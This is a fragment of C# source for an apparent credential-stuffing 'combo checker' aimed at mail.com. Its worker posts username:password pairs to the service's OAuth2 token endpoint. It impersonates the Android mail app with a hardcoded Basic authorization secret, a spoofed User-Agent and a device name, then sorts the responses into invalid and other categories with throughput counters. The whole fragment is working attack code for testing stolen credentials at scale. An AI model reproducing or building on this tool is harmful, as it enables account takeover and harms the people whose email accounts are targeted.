        ...
        static void Worker(string combo)
        {
            try
            {
                ...
                })
                {
                    ...
                    request.AddHeader("Authorization", "Basic bWFpbGNvbV9tYWlsYXBwX2FuZHJvaWQ6a2luMmxTU2tVUXRRQ0NsWG9YZklOaEp1bUc2SmQwM0taNVdMN05KOQ==");
                    request.AddHeader("User-Agent", "mailcom.android.androidmail/6.20.3 Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G930L Build/NRD90M)");
                    request.AddHeader("X-UI-APP", "mailcom.android.androidmail/6.20.3");
                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded;charset=\"UTF-8\"");
                    request.AddHeader("Host", "oauth2.mail.com");
                    request.AddHeader("Connection", "Keep-Alive");
                    request.AddHeader("Accept-Encoding", "gzip");
                    string str = $"grant_type=password&username={WebUtility.UrlEncode(credentials[0])}&password={WebUtility.UrlEncode(credentials[1])}&device_name=samsung+SM-G930L";
                    string k = request.Post("https://oauth2.mail.com/token", str, "application/x-www-form-urlencoded;charset=\"UTF-8\"").ToString();
                    if (k.Contains("ACCOUNT_NOT_FOUND_OR_PASSWORD_WRONG") || k.Contains("invalid_request"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                    ...
                    else if (k.Contains("Perm.UNDISCLOSED") || k.Contains("Perm.BAD_REQUEST"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
